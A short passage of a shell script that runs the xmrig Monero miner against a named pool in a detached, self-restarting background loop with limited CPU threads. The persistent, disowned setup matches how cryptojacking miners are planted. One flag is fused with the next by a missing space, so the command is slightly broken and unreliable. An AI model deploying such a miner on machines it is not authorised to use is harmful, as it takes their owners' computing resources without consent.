...
nohup bash -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero--randomx-mode=light --cpu-max-threads-hint=5; sleep 60; done" > xmrig.log 2>&1 &
disown
